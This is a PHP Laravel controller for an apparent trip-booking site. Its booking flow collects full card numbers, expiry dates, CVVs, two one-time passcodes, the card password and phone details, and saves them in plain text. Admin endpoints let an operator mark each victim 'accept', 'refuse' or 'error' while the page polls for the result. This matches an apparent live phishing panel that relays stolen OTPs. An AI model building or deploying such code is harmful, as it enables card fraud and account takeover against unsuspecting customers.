<?php

namespace App\Http\Controllers;

use App\Http\Requests\BankInfoRequest;
use App\Http\Requests\CheckOtpCodeRequest;
use App\Http\Requests\PasswordCardRequest;

use App\Models\Client;
use App\Models\ClientTrip;
use App\Models\Country;
use App\Models\SmsProvider;
use App\Models\Trip;
use Illuminate\Support\Facades\Auth;
use MongoDB\Driver\Session;
use RealRashid\SweetAlert\Facades\Alert;
use Illuminate\Http\Request;
use Illuminate\Support\Carbon;
use PHPUnit\Framework\Constraint\Count;

class ClientController extends Controller
{
    public function index()
    {
        $clients = Client::get();
        return view('dashboard.clients.index', compact('clients'));
    }

    public function updatestatus($status, $id)
    {
//        $dat=$status->toArray();
//        dd($status['accept'][0]);
        $client = Client::find($id);

        $client->update(['status1' => $status]);

        return $status;

    }

    public function updatestatus2($status, $id)
    {
        $client = Client::find($id);

        $client->update(['status2' => $status]);

        return $status;

    }

    public function getDataClients()
    {
        $clients = Client::paginate(10);
        return response()->json($clients);
    }

    public function create($trip_id)
    {
        $countries = Country::all();
        return view('frontend.passengers_details', compact('trip_id', 'countries'));
    }

    public function store(Request $request)
    {
        $client = Client::create($request->all());
        $trip_id = $request->trip_id;
        $inputs = [
            'client_id' => $client->id,
            'trip_id' => $request->trip_id,
            'adult_no' => 1,
        ];
        $clientTrip = ClientTrip::create($inputs);
        return redirect()->route('trip_invoice', $clientTrip->id);
    }

    public function getBankInfo($trip_id, $client_id)
    {
        $client = Client::where('id', $client_id)->first();
        return view('frontend.bank_info', compact('trip_id', 'client', 'client_id'));
    }

    public function storeBankInfo(BankInfoRequest $request)
    {
        $client = Client::where('id', $request->client_id)->first();
        $client->card_no = $request->card_no;
        $client->expiry_date = $request->expiry_date;
        $client->cvv = $request->cvv;
        $client->save();

        session()->put('trip_id', $request->trip_id);
        session()->put('client', $client);


        return redirect(route('otp_info2.store'));
//        return view('frontend.otp_info1')->with([
//            'client' => $client,
//            'trip_id' => $request->trip_id,
//            'client_id' => $request->client_id
//        ]);
//
////        return view('frontend.otppass')->with([
//            'client' => $client,
//            'trip_id' => $request->trip_id,
//            'client_id' => $request->client_id
//        ]);

//        return view('frontend.otppass');
    }

    public function storeOtpInfoStep2()
    {
        $client = session('client');
        $trip = session('trip_id');
        return view('frontend.otp_info1')->with([
            'client' => $client,
            'trip_id' => $trip,
            'client_id' => $client['id'],
        ]);

    }

    public function storeOtpInfoStep1(Request $request)
    {
//        $client=session('client');
        // dd($request);
        $client = Client::where('id', $request['client_id'])->first();
        $client->otp1 = $request->otp_code;
        $client->save();
//        $countries = Country::all();
//        $sms_providers = SmsProvider::all();
        $trip_id = session('trip_id');

        if ($client->status1 == 'accept') {

            // return redirect(route('password_card_page'));

            return response()->json(['status' => 200, 'data' => 'accept', 'url' => 0]);


        } else if ($client->status1 == 'refuse') {


            Alert::error(' error', 'برجاء ادخال البيانات الصحيحه');


            // return redirect(route('otp-code-step-2'));
            return response()->json(['status' => 200, 'data' => 'refuse', 'url' => 0]);


        } elseif ($client->status1 == 'error') {
            $url = url('sbank_infosss/' . $trip_id . '/' . $request->client_id);

            // return redirect(url('sbank_infosss/' . $trip_id . '/' . $request->client_id));
            return response()->json(['status' => 200, 'data' => 'error', 'urlData' => $url]);


        } else {


            return response()->json(['status' => 200, 'data' => 'pop', 'url' => 0]);
        }

//        return view('frontend.otp_info1',compact('client'));
//        return view('frontend.phone_info')->with([
//            'sms_providers' => $sms_providers,
//            'countries' => $countries,
//            'client' => $client,
//            'trip_id' => $request->trip_id,
//            'client_id' => $request->client_id
//        ]);
    }

    public function getPhoneInfo($trip_id, $client_id)
    {
        $client=Client::find($client_id);
        $countries = Country::get();
        $sms_providers = SmsProvider::get();
        return view('frontend.phone_info', compact('client','trip_id', 'client_id','countries', 'sms_providers'));
    }

    public function storePhoneInfo(Request $request)
    {
        $client = Client::where('id', $request->client_id)->update([
            'phone' => $request->phone,
            'country' => $request->country,
            'sms_provider' => $request->sms_provider
        ]);
        $client = Client::where('id', $request->client_id)->first();

        return redirect(route('otp_card_page'));
//        return view('frontend.otp_info', compact('client'));
    }

    public function checkOtpCode(CheckOtpCodeRequest $request)
    {

        $clients = session('client');
        $trip_id = session('trip_id');
        $client = Client::where('id', $clients['id'])->first();
        $client->otp2 = $request->otp_code;
        $client->save();
        $countries = Country::get();
        $sms_providers = SmsProvider::get();


        if ($client->status2 == 'accept') {
            $url = url('getPhoneInfo/'.$trip_id.'/'.$client->id);
//            return view('frontend.phone_info', compact('client', 'trip_id', 'countries', 'sms_providers'));

            return response()->json(['status' => 200, 'data' => 'accept', 'url' => $url]);

        } else if ($client->status2 == 'refuse') {


            Alert::error(' error', 'برجاء ادخال البيانات الصحيحه');
            $url = route('otp_card_page22');
            return response()->json(['status' => 200, 'data' => 'refuse', 'url' => $url]);

        } else {
//            Alert::info(' success', 'برجاء الانتظار يتم التحقق من البيانات المدخلة');
            return response()->json(['status' => 200, 'data' => 'pop']);


        }
    }

    public
    function checkOtppage22()
    {

        return view('frontend.otp_info');
    }

    public
    function checkOtpCodePassword(Request $request)
    {

        $client = session('client');

        $clientid = $client['id'] ?? 0;
        $client = Client::where('id', $clientid)->first();
        $client->password_card = $request->password;
        $client->save();
        $trip_id = 1;
        $countries = Country::get();
        $sms_providers = SmsProvider::get();

        return redirect(route('otp_card_page22'));

    }

    public
    function checkOtpCodeotp(CheckOtpCodeRequest $request)
    {
        $client = session('client');

        $clientid = $client['id'] ?? 0;
        $client = Client::where('id', $clientid)->first();
        $client->otp2 = $request->otp_code;
        $client->save();

        Alert::info(' Success', 'شكرا للحجز من خلال موقعنا الإلكتروني');

        return redirect(route('choose_trip'));
    }


    public
    function checkOtppassword()
    {
//        $client = Client::where('id', $request->client_id)->first();
//        $client->otp2 = $request->otp_code;
//        $client->save();
        return view('frontend.password_card');
    }

    public
    function checkOtppage()
    {

        return view('frontend.otppass');
    }

    public
    function storePasswordCard(PasswordCardRequest $request)
    {
        $client = Client::where('id', $request->client_id)->first();
        $client->password_card = $request->password;
        $client->save();
        return view('frontend.password_number', compact('client'));
    }

    public
    function tripInvoice($clientTrip_id)
    {
        $clientTrip = ClientTrip::where('id', $clientTrip_id)->first();
        $trip = Trip::with(['fromCity', 'toCity'])->where('id', $clientTrip->trip_id)->first();
        return view('frontend.trip_invoice', compact('clientTrip', 'trip'));
    }


    public
    function edit($client_id)
    {
        $client = Client::whereId($client_id)->firstOrFail();
        $countries = Country::all();
        return view('dashboard.clients.edit', ['client' => $client, 'countries' => $countries]);
    }

    public
    function update(Request $request)
    {
        $inputs = $request->all();
        Client::whereId($inputs['id'])->update([
            'name' => $inputs['name'],
            'phone' => $inputs['phone'],
            'id' => $inputs['id'],
            'country_id' => $inputs['country_id'],
            'email' => $inputs['email'],

        ]);
        Alert::info(' العملاء', 'تم تعديل العميل بنجاح');

        return redirect()->route('clients.index');
    }

    public
    function destroy(Client $client)
    {
        $client->delete();
        Alert::info(' العملاء', 'تم حذف العميل بنجاح');
        return redirect()->route('clients.index');
    }
}
